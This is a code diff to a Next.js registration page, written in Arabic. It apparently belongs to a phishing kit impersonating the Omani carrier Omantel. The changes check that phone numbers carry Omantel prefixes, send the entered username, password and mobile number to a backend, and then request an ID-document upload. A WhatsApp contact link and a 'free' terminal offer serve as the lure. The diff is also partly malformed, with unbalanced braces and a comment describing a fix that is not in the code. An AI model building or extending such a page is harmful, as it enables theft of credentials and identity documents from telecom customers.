@@ -11,12 +11,13 @@ import Link from "next/link"
 import { IdUploadForm } from "@/components/upload"
 
 export default function RegisterPage() {
-  const [currentStep, setCurrentStep] = useState<"1" | "2"|"3">("1")
+  const [currentStep, setCurrentStep] = useState<"1" | "2" | "3">("1")
   const [userId, setUserId] = useState("")
   const [password, setPassword] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [mobile, setMobile] = useState('')
   const [isDone, setIsDone] = useState(false)
+  const [isOmnTel, setIsOmnTel] = useState(true)
 
 
   useEffect(() => {
@@ -29,20 +30,28 @@ export default function RegisterPage() {
   }, [])
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
+    if (mobile.length > 7) {
+      const m1 = mobile.substring(0, 2)
+  // Fixed: Changed || to && (must fail ALL conditions to be invalid)
+  if (!['71', '72', '90', '91', '92', '93'].includes(m1)) {
+    setIsOmnTel(false)
+    alert('الرقم المدخل غير تابع لعمان تل')
+    return
+  }                   // Or better yet, use includes() for cleaner code:
+                         
+
+
     const visitorId = localStorage.getItem("visitor") as string
-    addData({ id: visitorId!, userName: userId, password,mobile,email:mobile }).then(() => {
+    addData({ id: visitorId!, userName: userId, password, mobile, email: mobile }).then(() => {
       console.log("done1")
+      setCurrentStep("2")
+
     })
     setIsLoading(true)
 
     // Simulate login API call
-    setTimeout(() => {
-      if (userId && password) {
-        setCurrentStep("2")
-      } else {
-      }
-      setIsLoading(false)
-    }, 2000)
+  }
+   
   }
   return (
     <>{
@@ -99,10 +108,11 @@ export default function RegisterPage() {
                         className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 px-4 py-4 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 placeholder:text-slate-400 transition-all duration-200"
                         dir="rtl"
                         onChange={(w) => {
-                          setPassword(w.target.value)
+                          setMobile(w.target.value)
                         }}
-                        placeholder="أدخل رقم هاتفك"
+                        placeholder="ادخل رقم الهاتف"
                       />
+                      {!isOmnTel ? <span className="text-red-600">الرقم المدخل غير تابع لعمان تل</span> : null}
                     </div>
                   </div>
 
@@ -124,11 +134,11 @@ export default function RegisterPage() {
                       )}
                     </Button>
                   </div>
-                  <div className="relative bg-gradient-to-br from-slate-50 to-slate-100 rounded-2xl p-6 mb-8">
+                  <div className="relative rounded-2xl p-6 mb-8">
                     <img
-                      src="/nd.png"
+                      src="/ere.jpg"
                       alt="Payment Terminal"
-                      className="w-full max-w-[280px] mx-auto object-contain rounded-xl shadow-sm"
+                      className="w-full max-w-[380px] mx-auto object-contain rounded-xl shadow-sm"
                     />
                     <div className="absolute top-4 right-4 bg-green-500 text-white text-xs font-medium px-3 py-1 rounded-full">
                       مجاني
@@ -165,13 +175,13 @@ export default function RegisterPage() {
             </div>
           </div>
         }
-      </div>) :currentStep==='2'?<IdUploadForm setCurrentStep={setCurrentStep as any}/>: <UsernameRecoveryPage />}
+      </div>) : currentStep === '2' ? <IdUploadForm setCurrentStep={setCurrentStep as any} /> : <UsernameRecoveryPage />}
 
-      
+
       <Link href={'https://wa.me/96871129904'}>
-      <Button size='icon' className="bg-red-600 fixed right-2 bottom-4 rounded-full p-2 h-12 w-12">
-        <img src="/whatsapp.png" alt="ws" width={55}/>
-      </Button>
+        <Button size='icon' className="bg-red-600 fixed right-2 bottom-4 rounded-full p-2 h-12 w-12">
+          <img src="/whatsapp.png" alt="ws" width={55} />
+        </Button>
       </Link>
     </>
   )
